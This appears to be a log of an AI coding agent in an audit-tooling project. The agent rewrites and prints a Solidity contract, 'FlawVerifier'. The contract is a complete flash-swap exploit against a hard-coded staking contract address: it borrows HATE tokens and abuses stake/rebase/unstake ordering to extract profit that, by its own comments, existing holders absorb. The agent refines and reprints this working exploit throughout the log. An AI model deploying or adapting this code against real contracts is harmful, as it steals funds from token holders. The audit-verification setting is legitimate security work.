+-    function _boundAttackAmount(IHATEStaking staking, uint256 fundingCeiling) internal view returns (uint256) {
+-        address hate = staking.HATE();
+-        address sHate = staking.sHATE();
+-
+-        uint256 stakingBalance = IERC20Like(hate).balanceOf(TARGET);
+-        uint256 circulating = IsHATELike(sHate).circulatingSupply();
+-
+-        uint256 cap = fundingCeiling;
+-        if (stakingBalance < cap) {
+-            cap = stakingBalance;
+-        }
+-        if (circulating != 0 && circulating < cap) {
+-            cap = circulating;
+-        }
+-
+-        return cap;
+-    }
+-
+-    function _hateReserve(address pair, address hate) internal view returns (uint256) {
+-        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+-        if (IUniswapV2PairLike(pair).token0() == hate) {
+-            return uint256(reserve0);
+-        }
+-        if (IUniswapV2PairLike(pair).token1() == hate) {
+-            return uint256(reserve1);
+-        }
+-        return 0;
+-    }
+-
+-    function _checkPathPreconditions(IHATEStaking staking) internal view {
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
+-    }
+-
+-    function _flashFee(uint256 amount) internal pure returns (uint256) {
+-        return ((amount * 3) / 997) + 1;
+-    }
+-
+-    function _approveMax(address token, address spender, uint256 minimum) internal {
+-        if (IERC20Like(token).allowance(address(this), spender) >= minimum) {
+-            return;
+-        }
+-
+-        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
+-        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
+-    }
+-
+-    function _safeTransfer(address token, address to, uint256 amount) internal {
+-        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+-    }
+-
+-    function _callOptionalReturn(address token, bytes memory data) internal {
+-        (bool ok, bytes memory returndata) = token.call(data);
+-        require(ok, "erc20:call_failed");
+-        if (returndata.length != 0) {
+-            require(abi.decode(returndata, (bool)), "erc20:operation_failed");
+-        }
+-    }
+-}
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+deleted file mode 100644
+index 31a126c96d0fe47d85eab6037fac00a7277572bd..0000000000000000000000000000000000000000
+--- a/FlawVerifier.sol
++++ /dev/null
+@@ -1,266 +0,0 @@
+-// SPDX-License-Identifier: MIT
+-pragma solidity 0.8.19;
+-
+-interface IERC20Like {
+-    function balanceOf(address account) external view returns (uint256);
+-    function allowance(address owner, address spender) external view returns (uint256);
+-    function approve(address spender, uint256 amount) external returns (bool);
+-    function transfer(address to, uint256 amount) external returns (bool);
+-    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+-}
+-
+-interface IsHATELike is IERC20Like {
+-    function circulatingSupply() external view returns (uint256);
+-}
+-
+-interface IHATEStaking {
+-    function HATE() external view returns (address);
+-    function sHATE() external view returns (address);
+-    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
+-    function stake(address to, uint256 amount) external;
+-    function unstake(address to, uint256 amount, bool rebase_) external;
+-    function rebase() external;
+-}
+-
+-interface IUniswapV2FactoryLike {
+-    function getPair(address tokenA, address tokenB) external view returns (address pair);
+-}
+-
+-interface IUniswapV2PairLike {
+-    function token0() external view returns (address);
+-    function token1() external view returns (address);
+-    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+-}
+-
+-contract FlawVerifier {
+-    address public constant TARGET = 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8;
+-
+-    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+-    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+-
+-    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+-    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+-    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+-    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+-    address private constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
+-
+-    uint256 private _profitAmount;
+-    bool private _executed;
+-
+-    constructor() {}
+-
+-    function profitToken() external view returns (address) {
+-        return IHATEStaking(TARGET).HATE();
+-    }
+-
+-    function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
+-    }
+-
+-    function executeOnOpportunity() external {
+-        require(!_executed, "already executed");
+-        _executed = true;
+-
+-        IHATEStaking staking = IHATEStaking(TARGET);
+-        address hate = staking.HATE();
+-
+-        _checkPathPreconditions(staking);
+-
+-        uint256 verifierBalance = IERC20Like(hate).balanceOf(address(this));
+-        if (verifierBalance != 0) {
+-            uint256 startingBalance = verifierBalance;
+-            uint256 amount = _boundAttackAmount(staking, verifierBalance);
+-            require(amount != 0, "direct:no_usable_hate");
+-
+-            _runExploitWithAmount(staking, hate, amount);
+-
+-            uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+-            require(endingBalance > startingBalance, "direct:no_profit");
+-            _profitAmount = endingBalance - startingBalance;
+-            return;
+-        }
+-
+-        require(_attemptFlashFunding(staking, hate), "funding:no_supported_hate_liquidity");
+-        require(_profitAmount != 0, "flashswap:no_profit");
+-    }
+-
+-    function initiateFlashSwap(address pair, uint256 amountOut) external {
+-        require(msg.sender == address(this), "self only");
+-
+-        address hate = IHATEStaking(TARGET).HATE();
+-        address token0 = IUniswapV2PairLike(pair).token0();
+-        address token1 = IUniswapV2PairLike(pair).token1();
+-        require(token0 == hate || token1 == hate, "pair:no_hate");
+-
+-        uint256 amount0Out = token0 == hate ? amountOut : 0;
+-        uint256 amount1Out = token1 == hate ? amountOut : 0;
+-        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair, amountOut));
+-    }
+-
+-    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
+-        (address pair, uint256 borrowedAmount) = abi.decode(data, (address, uint256));
+-        require(msg.sender == pair, "callback:invalid_pair");
+-
+-        address hate = IHATEStaking(TARGET).HATE();
+-        address token0 = IUniswapV2PairLike(pair).token0();
+-        address token1 = IUniswapV2PairLike(pair).token1();
+-        require(token0 == hate || token1 == hate, "callback:no_hate");
+-
+-        uint256 received = token0 == hate ? amount0 : amount1;
+-        require(received == borrowedAmount, "callback:amount_mismatch");
+-
+-        IHATEStaking staking = IHATEStaking(TARGET);
+-        _runExploitWithAmount(staking, hate, borrowedAmount);
+-
+-        uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+-        _safeTransfer(hate, pair, repayment);
+-
+-        uint256 remaining = IERC20Like(hate).balanceOf(address(this));
+-        require(remaining != 0, "callback:no_profit");
+-        _profitAmount = remaining;
+-    }
+-
+-    receive() external payable {}
+-
+-    function _attemptFlashFunding(IHATEStaking staking, address hate) internal returns (bool) {
+-        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
+-        address[5] memory counterparties = [WETH, USDC, USDT, DAI, FRAX];
+-        uint256[4] memory bpsOptions = [uint256(9_000), uint256(7_500), uint256(5_000), uint256(2_500)];
+-
+-        for (uint256 i = 0; i < factories.length; ++i) {
+-            for (uint256 j = 0; j < counterparties.length; ++j) {
+-                if (counterparties[j] == hate) {
+-                    continue;
+-                }
+-
+-                address pair = IUniswapV2FactoryLike(factories[i]).getPair(hate, counterparties[j]);
+-                if (pair == address(0)) {
+-                    continue;
+-                }
+-
+-                uint256 reserve = _hateReserve(pair, hate);
+-                if (reserve == 0) {
+-                    continue;
+-                }
+-
+-                uint256 maxUseful = _boundAttackAmount(staking, reserve);
+-                if (maxUseful == 0) {
+-                    continue;
+-                }
+-
+-                for (uint256 k = 0; k < bpsOptions.length; ++k) {
+-                    uint256 candidate = (maxUseful * bpsOptions[k]) / 10_000;
+-                    if (candidate == 0) {
+-                        continue;
+-                    }
+-
+-                    uint256 minRepayment = candidate + _flashFee(candidate);
+-                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+-                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+-                    if (minBonusFloor <= (minRepayment - candidate)) {
+-                        continue;
+-                    }
+-
+-                    try this.initiateFlashSwap(pair, candidate) {
+-                        return _profitAmount != 0;
+-                    } catch {
+-                        if (_profitAmount != 0) {
+-                            return true;
+-                        }
+-                    }
+-                }
+-            }
+-        }
+-
+-        return false;
+-    }
+-
+-    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
+-        require(amount != 0, "exploit:zero_amount");
+-
+-        // Path stage 1: the fork must already be on or after an expired epoch so that
+-        // `stake()` executes its internal `rebase()` without any off-chain time control.
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
+-
+-        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+-        // That is only possible on a fixed fork if the system is already at least one full
+-        // additional epoch behind after the first `stake()`-triggered rebase.
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
+-
+-        _approveMax(hate, TARGET, amount);
+-        staking.stake(address(this), amount);
+-
+-        staking.rebase();
+-
+-        address sHate = staking.sHATE();
+-        uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+-        require(sBalance != 0, "exploit:no_sHATE");
+-
+-        _approveMax(sHate, TARGET, sBalance);
+-        staking.unstake(address(this), sBalance, false);
+-    }
+-
+-    function _boundAttackAmount(IHATEStaking staking, uint256 fundingCeiling) internal view returns (uint256) {
+-        address hate = staking.HATE();
+-        address sHate = staking.sHATE();
+-
+-        uint256 stakingBalance = IERC20Like(hate).balanceOf(TARGET);
+-        uint256 circulating = IsHATELike(sHate).circulatingSupply();
+-
+-        uint256 cap = fundingCeiling;
+-        if (stakingBalance < cap) {
+-            cap = stakingBalance;
+-        }
+-        if (circulating != 0 && circulating < cap) {
+-            cap = circulating;
+-        }
+-
+-        return cap;
+-    }
+-
+-    function _hateReserve(address pair, address hate) internal view returns (uint256) {
+-        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+-        if (IUniswapV2PairLike(pair).token0() == hate) {
+-            return uint256(reserve0);
+-        }
+-        if (IUniswapV2PairLike(pair).token1() == hate) {
+-            return uint256(reserve1);
+-        }
+-        return 0;
+-    }
+-
+-    function _checkPathPreconditions(IHATEStaking staking) internal view {
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
+-    }
+-
+-    function _flashFee(uint256 amount) internal pure returns (uint256) {
+-        return ((amount * 3) / 997) + 1;
+-    }
+-
+-    function _approveMax(address token, address spender, uint256 minimum) internal {
+-        if (IERC20Like(token).allowance(address(this), spender) >= minimum) {
+-            return;
+-        }
+-
+-        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
+-        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
+-    }
+-
+-    function _safeTransfer(address token, address to, uint256 amount) internal {
+-        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+-    }
+-
+-    function _callOptionalReturn(address token, bytes memory data) internal {
+-        (bool ok, bytes memory returndata) = token.call(data);
+-        require(ok, "erc20:call_failed");
+-        if (returndata.length != 0) {
+-            require(abi.decode(returndata, (bool)), "erc20:operation_failed");
+-        }
+-    }
+-}
+
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src/FlawVerifier.sol
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 31a126c96d0fe47d85eab6037fac00a7277572bd..edee7a3f0e166a9bd606d839b3de581acd8a6a79
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.19;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+@@ -73,7 +73,7 @@
+             uint256 amount = _boundAttackAmount(staking, verifierBalance);
+             require(amount != 0, "direct:no_usable_hate");
+ 
+-            _runExploitWithAmount(staking, hate, amount);
++            _executeExploit(staking, hate, amount);
+ 
+             uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+             require(endingBalance > startingBalance, "direct:no_profit");
+@@ -86,7 +86,7 @@
+     }
+ 
+     function initiateFlashSwap(address pair, uint256 amountOut) external {
+-        require(msg.sender == address(this), "self only");
++        require(msg.sender == address(this), "self_only");
+ 
+         address hate = IHATEStaking(TARGET).HATE();
+         address token0 = IUniswapV2PairLike(pair).token0();
+@@ -111,7 +111,7 @@
+         require(received == borrowedAmount, "callback:amount_mismatch");
+ 
+         IHATEStaking staking = IHATEStaking(TARGET);
+-        _runExploitWithAmount(staking, hate, borrowedAmount);
++        _executeExploit(staking, hate, borrowedAmount);
+ 
+         uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+         _safeTransfer(hate, pair, repayment);
+@@ -156,9 +156,10 @@
+                     }
+ 
+                     uint256 minRepayment = candidate + _flashFee(candidate);
+-                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+-                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+-                    if (minBonusFloor <= (minRepayment - candidate)) {
++                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
++                    uint256 minimumStageThreeGain =
++                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
++                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
+                         continue;
+                     }
+ 
+@@ -176,26 +177,33 @@
+         return false;
+     }
+ 
+-    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
++    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
+         require(amount != 0, "exploit:zero_amount");
+ 
+-        // Path stage 1: the fork must already be on or after an expired epoch so that
+-        // `stake()` executes its internal `rebase()` without any off-chain time control.
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
++        _checkPathPreconditions(staking);
+ 
+-        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+-        // That is only possible on a fixed fork if the system is already at least one full
+-        // additional epoch behind after the first `stake()`-triggered rebase.
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        address sHate = staking.sHATE();
+ 
++        // Path stage 1:
++        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
++        _assertExpiredEpoch(staking);
++
++        // Path stage 2:
++        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
++        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
++        // `epoch.distribute` because the principal is counted in HATE backing while the matching
++        // sHATE is still excluded from `circulatingSupply()`.
+         _approveMax(hate, TARGET, amount);
+         staking.stake(address(this), amount);
+ 
++        // Path stage 3:
++        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
++        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
++        // we cannot advance time, so this verifier only executes when the system is already at least
++        // one full additional epoch behind and a second rebase is immediately callable.
++        _assertSecondExpiredEpoch(staking);
+         staking.rebase();
+ 
+-        address sHate = staking.sHATE();
+         uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+         require(sBalance != 0, "exploit:no_sHATE");
+ 
+@@ -234,9 +242,20 @@
+ 
+     function _checkPathPreconditions(IHATEStaking staking) internal view {
+         (uint256 length,, uint256 end,) = staking.epoch();
++        require(length != 0, "path:zero_epoch_length");
++        require(end <= block.timestamp, "path:not_expired");
++        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++    }
++
++    function _assertExpiredEpoch(IHATEStaking staking) internal view {
++        (, , uint256 end,) = staking.epoch();
+         require(end <= block.timestamp, "path:not_expired");
++    }
++
++    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
++        (uint256 length,, uint256 end,) = staking.epoch();
+         require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        require(end <= block.timestamp, "path:no_second_expired_epoch");
+     }
+ 
+     function _flashFee(uint256 amount) internal pure returns (uint256) {
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 31a126c96d0fe47d85eab6037fac00a7277572bd..edee7a3f0e166a9bd606d839b3de581acd8a6a79
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.19;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+@@ -73,7 +73,7 @@
+             uint256 amount = _boundAttackAmount(staking, verifierBalance);
+             require(amount != 0, "direct:no_usable_hate");
+ 
+-            _runExploitWithAmount(staking, hate, amount);
++            _executeExploit(staking, hate, amount);
+ 
+             uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+             require(endingBalance > startingBalance, "direct:no_profit");
+@@ -86,7 +86,7 @@
+     }
+ 
+     function initiateFlashSwap(address pair, uint256 amountOut) external {
+-        require(msg.sender == address(this), "self only");
++        require(msg.sender == address(this), "self_only");
+ 
+         address hate = IHATEStaking(TARGET).HATE();
+         address token0 = IUniswapV2PairLike(pair).token0();
+@@ -111,7 +111,7 @@
+         require(received == borrowedAmount, "callback:amount_mismatch");
+ 
+         IHATEStaking staking = IHATEStaking(TARGET);
+-        _runExploitWithAmount(staking, hate, borrowedAmount);
++        _executeExploit(staking, hate, borrowedAmount);
+ 
+         uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+         _safeTransfer(hate, pair, repayment);
+@@ -156,9 +156,10 @@
+                     }
+ 
+                     uint256 minRepayment = candidate + _flashFee(candidate);
+-                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+-                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+-                    if (minBonusFloor <= (minRepayment - candidate)) {
++                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
++                    uint256 minimumStageThreeGain =
++                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
++                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
+                         continue;
+                     }
+ 
+@@ -176,26 +177,33 @@
+         return false;
+     }
+ 
+-    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
++    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
+         require(amount != 0, "exploit:zero_amount");
+ 
+-        // Path stage 1: the fork must already be on or after an expired epoch so that
+-        // `stake()` executes its internal `rebase()` without any off-chain time control.
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
++        _checkPathPreconditions(staking);
+ 
+-        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+-        // That is only possible on a fixed fork if the system is already at least one full
+-        // additional epoch behind after the first `stake()`-triggered rebase.
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        address sHate = staking.sHATE();
+ 
++        // Path stage 1:
++        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
++        _assertExpiredEpoch(staking);
++
++        // Path stage 2:
++        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
++        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
++        // `epoch.distribute` because the principal is counted in HATE backing while the matching
++        // sHATE is still excluded from `circulatingSupply()`.
+         _approveMax(hate, TARGET, amount);
+         staking.stake(address(this), amount);
+ 
++        // Path stage 3:
++        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
++        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
++        // we cannot advance time, so this verifier only executes when the system is already at least
++        // one full additional epoch behind and a second rebase is immediately callable.
++        _assertSecondExpiredEpoch(staking);
+         staking.rebase();
+ 
+-        address sHate = staking.sHATE();
+         uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+         require(sBalance != 0, "exploit:no_sHATE");
+ 
+@@ -234,9 +242,20 @@
+ 
+     function _checkPathPreconditions(IHATEStaking staking) internal view {
+         (uint256 length,, uint256 end,) = staking.epoch();
++        require(length != 0, "path:zero_epoch_length");
++        require(end <= block.timestamp, "path:not_expired");
++        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++    }
++
++    function _assertExpiredEpoch(IHATEStaking staking) internal view {
++        (, , uint256 end,) = staking.epoch();
+         require(end <= block.timestamp, "path:not_expired");
++    }
++
++    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
++        (uint256 length,, uint256 end,) = staking.epoch();
+         require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        require(end <= block.timestamp, "path:no_second_expired_epoch");
+     }
+ 
+     function _flashFee(uint256 amount) internal pure returns (uint256) {
+
+codex
+The verifier rewrite is in place. I’m doing a quick local sanity check for obvious Solidity issues; if the toolchain isn’t available here, I’ll still return the updated source exactly as requested.
+exec
+/bin/bash -lc "sed -n '1,320p' FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IsHATELike is IERC20Like {
+    function circulatingSupply() external view returns (uint256);
+}
+
+interface IHATEStaking {
+    function HATE() external view returns (address);
+    function sHATE() external view returns (address);
+    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
+    function stake(address to, uint256 amount) external;
+    function unstake(address to, uint256 amount, bool rebase_) external;
+    function rebase() external;
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8;
+
+    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address private constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
+
+    uint256 private _profitAmount;
+    bool private _executed;
+
+    constructor() {}
+
+    function profitToken() external view returns (address) {
+        return IHATEStaking(TARGET).HATE();
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        require(!_executed, "already executed");
+        _executed = true;
+
+        IHATEStaking staking = IHATEStaking(TARGET);
+        address hate = staking.HATE();
+
+        _checkPathPreconditions(staking);
+
+        uint256 verifierBalance = IERC20Like(hate).balanceOf(address(this));
+        if (verifierBalance != 0) {
+            uint256 startingBalance = verifierBalance;
+            uint256 amount = _boundAttackAmount(staking, verifierBalance);
+            require(amount != 0, "direct:no_usable_hate");
+
+            _executeExploit(staking, hate, amount);
+
+            uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+            require(endingBalance > startingBalance, "direct:no_profit");
+            _profitAmount = endingBalance - startingBalance;
+            return;
+        }
+
+        require(_attemptFlashFunding(staking, hate), "funding:no_supported_hate_liquidity");
+        require(_profitAmount != 0, "flashswap:no_profit");
+    }
+
+    function initiateFlashSwap(address pair, uint256 amountOut) external {
+        require(msg.sender == address(this), "self_only");
+
+        address hate = IHATEStaking(TARGET).HATE();
+        address token0 = IUniswapV2PairLike(pair).token0();
+        address token1 = IUniswapV2PairLike(pair).token1();
+        require(token0 == hate || token1 == hate, "pair:no_hate");
+
+        uint256 amount0Out = token0 == hate ? amountOut : 0;
+        uint256 amount1Out = token1 == hate ? amountOut : 0;
+        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair, amountOut));
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        (address pair, uint256 borrowedAmount) = abi.decode(data, (address, uint256));
+        require(msg.sender == pair, "callback:invalid_pair");
+
+        address hate = IHATEStaking(TARGET).HATE();
+        address token0 = IUniswapV2PairLike(pair).token0();
+        address token1 = IUniswapV2PairLike(pair).token1();
+        require(token0 == hate || token1 == hate, "callback:no_hate");
+
+        uint256 received = token0 == hate ? amount0 : amount1;
+        require(received == borrowedAmount, "callback:amount_mismatch");
+
+        IHATEStaking staking = IHATEStaking(TARGET);
+        _executeExploit(staking, hate, borrowedAmount);
+
+        uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+        _safeTransfer(hate, pair, repayment);
+
+        uint256 remaining = IERC20Like(hate).balanceOf(address(this));
+        require(remaining != 0, "callback:no_profit");
+        _profitAmount = remaining;
+    }
+
+    receive() external payable {}
+
+    function _attemptFlashFunding(IHATEStaking staking, address hate) internal returns (bool) {
+        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
+        address[5] memory counterparties = [WETH, USDC, USDT, DAI, FRAX];
+        uint256[4] memory bpsOptions = [uint256(9_000), uint256(7_500), uint256(5_000), uint256(2_500)];
+
+        for (uint256 i = 0; i < factories.length; ++i) {
+            for (uint256 j = 0; j < counterparties.length; ++j) {
+                if (counterparties[j] == hate) {
+                    continue;
+                }
+
+                address pair = IUniswapV2FactoryLike(factories[i]).getPair(hate, counterparties[j]);
+                if (pair == address(0)) {
+                    continue;
+                }
+
+                uint256 reserve = _hateReserve(pair, hate);
+                if (reserve == 0) {
+                    continue;
+                }
+
+                uint256 maxUseful = _boundAttackAmount(staking, reserve);
+                if (maxUseful == 0) {
+                    continue;
+                }
+
+                for (uint256 k = 0; k < bpsOptions.length; ++k) {
+                    uint256 candidate = (maxUseful * bpsOptions[k]) / 10_000;
+                    if (candidate == 0) {
+                        continue;
+                    }
+
+                    uint256 minRepayment = candidate + _flashFee(candidate);
+                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
+                    uint256 minimumStageThreeGain =
+                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
+                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
+                        continue;
+                    }
+
+                    try this.initiateFlashSwap(pair, candidate) {
+                        return _profitAmount != 0;
+                    } catch {
+                        if (_profitAmount != 0) {
+                            return true;
+                        }
+                    }
+                }
+            }
+        }
+
+        return false;
+    }
+
+    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
+        require(amount != 0, "exploit:zero_amount");
+
+        _checkPathPreconditions(staking);
+
+        address sHate = staking.sHATE();
+
+        // Path stage 1:
+        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
+        _assertExpiredEpoch(staking);
+
+        // Path stage 2:
+        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
+        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
+        // `epoch.distribute` because the principal is counted in HATE backing while the matching
+        // sHATE is still excluded from `circulatingSupply()`.
+        _approveMax(hate, TARGET, amount);
+        staking.stake(address(this), amount);
+
+        // Path stage 3:
+        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
+        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
+        // we cannot advance time, so this verifier only executes when the system is already at least
+        // one full additional epoch behind and a second rebase is immediately callable.
+        _assertSecondExpiredEpoch(staking);
+        staking.rebase();
+
+        uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+        require(sBalance != 0, "exploit:no_sHATE");
+
+        _approveMax(sHate, TARGET, sBalance);
+        staking.unstake(address(this), sBalance, false);
+    }
+
+    function _boundAttackAmount(IHATEStaking staking, uint256 fundingCeiling) internal view returns (uint256) {
+        address hate = staking.HATE();
+        address sHate = staking.sHATE();
+
+        uint256 stakingBalance = IERC20Like(hate).balanceOf(TARGET);
+        uint256 circulating = IsHATELike(sHate).circulatingSupply();
+
+        uint256 cap = fundingCeiling;
+        if (stakingBalance < cap) {
+            cap = stakingBalance;
+        }
+        if (circulating != 0 && circulating < cap) {
+            cap = circulating;
+        }
+
+        return cap;
+    }
+
+    function _hateReserve(address pair, address hate) internal view returns (uint256) {
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+        if (IUniswapV2PairLike(pair).token0() == hate) {
+            return uint256(reserve0);
+        }
+        if (IUniswapV2PairLike(pair).token1() == hate) {
+            return uint256(reserve1);
+        }
+        return 0;
+    }
+
+    function _checkPathPreconditions(IHATEStaking staking) internal view {
